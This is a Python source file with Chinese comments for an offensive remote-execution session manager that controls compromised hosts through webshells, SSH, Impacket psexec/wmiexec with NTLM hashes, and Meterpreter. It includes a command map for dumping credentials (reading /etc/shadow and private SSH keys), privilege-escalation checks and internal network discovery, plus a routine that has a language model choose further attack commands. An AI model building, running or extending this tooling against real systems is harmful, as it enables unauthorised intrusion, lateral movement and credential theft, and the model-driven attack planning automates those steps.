# remote_executor/session_manager.py
"""
Shell会话管理器

管理所有远程会话，支持多种会话类型:
- webshell: HTTP WebShell
- reverse_shell: 反弹Shell
- ssh: SSH连接
- impacket: psexec/wmiexec
- meterpreter: MSF会话

设计理念:
- 统一的会话接口
- 支持会话持久化
- 自动重连机制
"""
import os
import json
import time
import uuid
import socket
import subprocess
import requests
from enum import Enum
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field, asdict
from threading import Lock


class ShellType(Enum):
    """Shell会话类型"""
    WEBSHELL = "webshell"
    REVERSE_SHELL = "reverse_shell"
    SSH = "ssh"
    IMPACKET = "impacket"
    METERPRETER = "meterpreter"
    CS_BEACON = "cs_beacon"


@dataclass
class ShellSession:
    """
    Shell会话定义

    Attributes:
        id: 会话唯一标识
        session_type: 会话类型
        target: 目标主机
        os_type: 操作系统类型 (windows/linux)
        created_at: 创建时间
        last_active: 最后活跃时间
        is_admin: 是否有管理员权限
        is_system: 是否有SYSTEM/ROOT权限
        internal_ips: 发现的内网IP
        metadata: 额外元数据
    """
    id: str
    session_type: ShellType
    target: str
    os_type: str = "linux"
    created_at: float = field(default_factory=time.time)
    last_active: float = field(default_factory=time.time)
    is_admin: bool = False
    is_system: bool = False
    internal_ips: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)

    # 连接信息 (根据类型不同)
    url: str = ""  # webshell URL
    password: str = ""  # webshell密码
    username: str = ""  # SSH/Windows用户名
    host: str = ""  # 目标主机
    port: int = 22  # 端口
    private_key: str = ""  # SSH私钥

    def to_dict(self) -> Dict:
        """转换为字典"""
        data = asdict(self)
        data['session_type'] = self.session_type.value
        return data

    @classmethod
    def from_dict(cls, data: Dict) -> 'ShellSession':
        """从字典创建"""
        data['session_type'] = ShellType(data['session_type'])
        return cls(**data)


class ShellSessionManager:
    """
    Shell会话管理器

    功能:
    - 创建和管理多种类型的会话
    - 会话持久化
    - 自动检测会话状态
    """

    def __init__(self):
        self.sessions: Dict[str, ShellSession] = {}
        self.lock = Lock()
        self.session_file = "data/sessions.json"
        self._load_sessions()

    def _load_sessions(self):
        """从文件加载会话"""
        if os.path.exists(self.session_file):
            try:
                with open(self.session_file, 'r') as f:
                    data = json.load(f)
                    for sid, sdata in data.items():
                        self.sessions[sid] = ShellSession.from_dict(sdata)
            except Exception as e:
                print(f"[SessionManager] 加载会话失败: {e}")

    def _save_sessions(self):
        """保存会话到文件"""
        os.makedirs(os.path.dirname(self.session_file), exist_ok=True)
        try:
            with open(self.session_file, 'w') as f:
                json.dump({sid: s.to_dict() for sid, s in self.sessions.items()}, f)
        except Exception as e:
            print(f"[SessionManager] 保存会话失败: {e}")

    def create_webshell_session(
        self,
        url: str,
        password: str = "",
        shell_type: str = "custom",
        os_type: str = "linux"
    ) -> ShellSession:
        """
        创建WebShell会话

        Args:
            url: WebShell URL
            password: 密码 (如冰蝎、哥斯拉需要)
            shell_type: 类型 (behinder, godzilla, custom)
            os_type: 操作系统类型

        Returns:
            ShellSession
        """
        session_id = str(uuid.uuid4())[:8]

        # 探测目标系统
        detected_os = self._detect_os_from_webshell(url, password) or os_type

        session = ShellSession(
            id=session_id,
            session_type=ShellType.WEBSHELL,
            target=url,
            os_type=detected_os,
            url=url,
            password=password,
            metadata={"shell_type": shell_type}
        )

        with self.lock:
            self.sessions[session_id] = session
            self._save_sessions()

        print(f"[SessionManager] 创建WebShell会话: {session_id} -> {url}")
        return session

    def create_ssh_session(
        self,
        host: str,
        username: str,
        password: str = "",
        private_key: str = "",
        port: int = 22
    ) -> Optional[ShellSession]:
        """
        创建SSH会话

        Args:
            host: 目标主机
            username: 用户名
            password: 密码
            private_key: 私钥路径或内容
            port: SSH端口

        Returns:
            ShellSession 或 None
        """
        # 测试连接
        if not self._test_ssh_connection(host, username, password, private_key, port):
            print(f"[SessionManager] SSH连接失败: {username}@{host}:{port}")
            return None

        session_id = str(uuid.uuid4())[:8]

        # 检测权限
        is_root = False
        internal_ips = []
        if password or private_key:
            # 执行命令检测
            result = self._execute_ssh_command(
                host, username, password, private_key, port, "id; hostname -I"
            )
            if result:
                is_root = "uid=0" in result or "root" in result
                # 提取内网IP
                import re
                ips = re.findall(r'\d+\.\d+\.\d+\.\d+', result)
                internal_ips = [ip for ip in ips if not ip.startswith('127.')]

        session = ShellSession(
            id=session_id,
            session_type=ShellType.SSH,
            target=host,
            os_type="linux",
            host=host,
            port=port,
            username=username,
            password=password,
            private_key=private_key,
            is_admin=is_root,
            is_system=is_root,
            internal_ips=internal_ips
        )

        with self.lock:
            self.sessions[session_id] = session
            self._save_sessions()

        print(f"[SessionManager] 创建SSH会话: {session_id} -> {username}@{host}:{port}")
        return session

    def create_impacket_session(
        self,
        host: str,
        username: str,
        password: str = "",
        hash_: str = "",
        domain: str = "",
        method: str = "psexec"
    ) -> Optional[ShellSession]:
        """
        创建Impacket会话 (psexec/wmiexec)

        Args:
            host: 目标主机
            username: 用户名
            password: 密码
            hash_: NTLM哈希
            domain: 域名
            method: 方法 (psexec, wmiexec, smbexec)

        Returns:
            ShellSession 或 None
        """
        session_id = str(uuid.uuid4())[:8]

        # 检测是否是管理员
        is_admin = self._check_impacket_admin(host, username, password, hash_, domain)

        session = ShellSession(
            id=session_id,
            session_type=ShellType.IMPACKET,
            target=host,
            os_type="windows",
            host=host,
            username=username,
            password=password,
            metadata={
                "hash": hash_,
                "domain": domain,
                "method": method
            },
            is_admin=is_admin
        )

        with self.lock:
            self.sessions[session_id] = session
            self._save_sessions()

        print(f"[SessionManager] 创建Impacket会话: {session_id} -> {username}@{host} ({method})")
        return session

    def get_session(self, session_id: str) -> Optional[ShellSession]:
        """获取会话"""
        return self.sessions.get(session_id)

    def list_sessions(self) -> List[ShellSession]:
        """列出所有会话"""
        return list(self.sessions.values())

    def remove_session(self, session_id: str):
        """移除会话"""
        with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
                self._save_sessions()

    def update_session(self, session_id: str, **kwargs):
        """更新会话属性"""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                for key, value in kwargs.items():
                    if hasattr(session, key):
                        setattr(session, key, value)
                session.last_active = time.time()
                self._save_sessions()

    # ==================== 辅助方法 ====================

    def _detect_os_from_webshell(self, url: str, password: str) -> Optional[str]:
        """通过WebShell检测操作系统"""
        try:
            # 尝试执行简单的探测命令
            test_commands = [
                ("whoami", "windows"),
                ("id", "linux"),
                ("ver", "windows"),
                ("uname", "linux")
            ]

            for cmd, os_type in test_commands:
                # 这里需要实际的webshell执行器
                pass

            return None
        except Exception:
            return None

    def _test_ssh_connection(
        self, host: str, username: str, password: str, private_key: str, port: int
    ) -> bool:
        """测试SSH连接"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            if private_key:
                if os.path.exists(private_key):
                    key = paramiko.RSAKey.from_private_key_file(private_key)
                else:
                    import io
                    key = paramiko.RSAKey.from_private_key(io.StringIO(private_key))
                client.connect(host, port, username, pkey=key, timeout=10)
            else:
                client.connect(host, port, username, password, timeout=10)

            client.close()
            return True
        except Exception as e:
            print(f"[SessionManager] SSH测试失败: {e}")
            return False

    def _execute_ssh_command(
        self, host: str, username: str, password: str, private_key: str, port: int, command: str
    ) -> Optional[str]:
        """通过SSH执行命令"""
        try:
            import paramiko
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            if private_key:
                if os.path.exists(private_key):
                    key = paramiko.RSAKey.from_private_key_file(private_key)
                else:
                    import io
                    key = paramiko.RSAKey.from_private_key(io.StringIO(private_key))
                client.connect(host, port, username, pkey=key, timeout=10)
            else:
                client.connect(host, port, username, password, timeout=10)

            stdin, stdout, stderr = client.exec_command(command)
            result = stdout.read().decode('utf-8', errors='ignore')
            client.close()
            return result
        except Exception:
            return None

    def _check_impacket_admin(
        self, host: str, username: str, password: str, hash_: str, domain: str
    ) -> bool:
        """检查Impacket会话是否有管理员权限"""
        # 通过crackmapexec检查
        try:
            cmd = ["crackmapexec", "smb", host, "-u", username]
            if password:
                cmd.extend(["-p", password])
            if hash_:
                cmd.extend(["-H", hash_])
            if domain:
                cmd.extend(["-d", domain])

            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return "Pwn3d!" in result.stdout or "(admin)" in result.stdout.lower()
        except Exception:
            return False

    # ==================== 统一命令执行接口 ====================

    def execute_command(self, session_id: str, command: str,
                        timeout: float = 30) -> Dict:
        """
        统一的命令执行接口

        根据会话类型自动选择执行方法

        Args:
            session_id: 会话ID
            command: 要执行的命令
            timeout: 超时时间（秒）

        Returns:
            {"success": bool, "output": str, "error": str}
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"success": False, "output": "", "error": "会话不存在"}

        try:
            if session.session_type == ShellType.WEBSHELL:
                result = self._execute_webshell(session, command, timeout)

            elif session.session_type == ShellType.SSH:
                result = self._execute_ssh(session, command, timeout)

            elif session.session_type == ShellType.METERPRETER:
                result = self._execute_meterpreter(session, command)

            elif session.session_type == ShellType.IMPACKET:
                result = self._execute_impacket(session, command, timeout)

            else:
                return {"success": False, "output": "", "error": f"不支持的会话类型: {session.session_type}"}

            # 更新活跃时间
            session.last_active = time.time()

            return result

        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    def _execute_webshell(self, session: ShellSession, command: str,
                          timeout: float) -> Dict:
        """通过WebShell执行命令"""
        # 根据webshell类型执行
        shell_type = session.metadata.get("shell_type", "custom")

        if shell_type == "behinder":
            return self._execute_behinder(session, command, timeout)
        elif shell_type == "godzilla":
            return self._execute_godzilla(session, command, timeout)
        else:
            return self._execute_generic_webshell(session, command, timeout)

    def _execute_behinder(self, session: ShellSession, command: str,
                          timeout: float) -> Dict:
        """执行冰蝎WebShell"""
        # 冰蝎使用加密通信
        try:
            import requests
            # 构造请求（需要根据冰蝎协议）
            payload = {"command": command}
            resp = requests.post(session.url, json=payload, timeout=timeout)
            return {"success": True, "output": resp.text, "error": ""}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    def _execute_godzilla(self, session: ShellSession, command: str,
                          timeout: float) -> Dict:
        """执行哥斯拉WebShell"""
        try:
            import requests
            # 构造请求（需要根据哥斯拉协议）
            payload = {"pass": command}
            resp = requests.post(session.url, data=payload, timeout=timeout)
            return {"success": True, "output": resp.text, "error": ""}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    def _execute_generic_webshell(self, session: ShellSession, command: str,
                                   timeout: float) -> Dict:
        """执行普通WebShell"""
        try:
            import requests
            # 简单的GET/POST方式
            resp = requests.get(
                f"{session.url}?cmd={command}",
                timeout=timeout
            )
            return {"success": True, "output": resp.text, "error": ""}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    def _execute_ssh(self, session: ShellSession, command: str,
                     timeout: float) -> Dict:
        """通过SSH执行命令"""
        result = self._execute_ssh_command(
            session.host,
            session.username,
            session.password,
            session.private_key,
            session.port,
            command
        )
        if result:
            return {"success": True, "output": result, "error": ""}
        return {"success": False, "output": "", "error": "SSH执行失败"}

    def _execute_meterpreter(self, session: ShellSession, command: str) -> Dict:
        """通过Meterpreter执行命令"""
        try:
            from tools.metasploit_manager import get_msf_manager
            msf = get_msf_manager()

            # 尝试连接
            if not msf.token:
                msf.connect()

            if not msf.token:
                return {"success": False, "output": "", "error": "无法连接MSF"}

            # 执行命令
            result = msf.execute(int(session.id), command)
            return result

        except ImportError:
            return {"success": False, "output": "", "error": "MSF模块未安装"}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    def _execute_impacket(self, session: ShellSession, command: str,
                          timeout: float) -> Dict:
        """通过Impacket执行命令"""
        try:
            # 使用impacket工具执行命令
            method = session.metadata.get("method", "psexec")
            hash_ = session.metadata.get("hash", "")
            domain = session.metadata.get("domain", "")

            # 构建命令
            import shutil
            script_map = {
                "psexec": "psexec.py",
                "wmiexec": "wmiexec.py",
                "smbexec": "smbexec.py",
                "atexec": "atexec.py"
            }

            script = script_map.get(method, "psexec.py")
            script_path = shutil.which(script)

            if not script_path:
                return {"success": False, "output": "", "error": f"找不到 {script}"}

            # 构建认证
            if domain:
                auth = f"{domain}/{session.username}"
            else:
                auth = session.username

            if hash_:
                cmd = [script_path, "-hashes", hash_, f"{auth}@{session.host}", command]
            else:
                cmd = [script_path, f"{auth}:{session.password}@{session.host}", command]

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            return {
                "success": result.returncode == 0,
                "output": result.stdout,
                "error": result.stderr if result.returncode != 0 else ""
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "", "error": "执行超时"}
        except Exception as e:
            return {"success": False, "output": "", "error": str(e)}

    # ==================== 智能交互 ====================

    def smart_execute(self, session_id: str, goal: str) -> Dict:
        """
        智能执行 - 根据目标自动决定操作

        Args:
            session_id: 会话ID
            goal: 目标描述
                - "获取系统信息"
                - "提权"
                - "导出凭据"
                - "发现内网"

        Returns:
            {
                "success": bool,
                "result": "结果描述",
                "output": "详细输出",
                "next_steps": ["建议的下一步"]
            }
        """
        session = self.sessions.get(session_id)
        if not session:
            return {"success": False, "result": "会话不存在", "output": "", "next_steps": []}

        # 预定义的命令映射
        command_map = {
            "获取系统信息": {
                "linux": "whoami && id && hostname && uname -a",
                "windows": "whoami && hostname && systeminfo"
            },
            "提权检查": {
                "linux": "sudo -l 2>/dev/null; find / -perm -4000 2>/dev/null",
                "windows": "whoami /priv"
            },
            "发现内网": {
                "linux": "ip a; ip route; arp -a 2>/dev/null",
                "windows": "ipconfig /all && arp -a"
            },
            "导出凭据": {
                "linux": "cat /etc/shadow 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null",
                "windows": "type %USERPROFILE%\\Desktop\\* 2>nul"
            }
        }

        # 获取目标命令
        if goal in command_map:
            command = command_map[goal].get(
                session.os_type,
                command_map[goal].get("linux", "")
            )
        else:
            # AI决策
            command = self._ai_plan_command(session, goal)

        if not command:
            return {"success": False, "result": "无法确定命令", "output": "", "next_steps": []}

        # 执行命令
        result = self.execute_command(session_id, command)

        return {
            "success": result.get("success", False),
            "result": goal if result.get("success") else f"{goal} 失败",
            "output": result.get("output", ""),
            "error": result.get("error", ""),
            "next_steps": []
        }

    def _ai_plan_command(self, session: ShellSession, goal: str) -> str:
        """AI规划命令"""
        try:
            from llm_client import llm_client
            from config import config
            import json

            prompt = f"""根据目标和环境，决定要执行的命令。

## 目标
{goal}

## 环境
- 操作系统: {session.os_type}
- 目标: {session.target}
- 会话类型: {session.session_type.value}
- 权限: {'管理员' if session.is_admin else '普通用户'}

## 输出格式 (JSON)
{{
  "command": "要执行的命令",
  "description": "命令说明"
}}
"""
            response = llm_client.call_chat_completion(
                model=config.ANALYST_MODEL,
                messages=[{"role": "user", "content": prompt}],
                temperature=0.1,
                json_mode=True
            )

            if "```json" in response:
                response = response.split("```json")[1].split("```")[0]

            data = json.loads(response.strip())
            return data.get("command", "")

        except Exception:
            return ""


# 全局会话管理器实例
_session_manager = None

def get_session_manager() -> ShellSessionManager:
    """获取全局会话管理器"""
    global _session_manager
    if _session_manager is None:
        _session_manager = ShellSessionManager()
    return _session_manager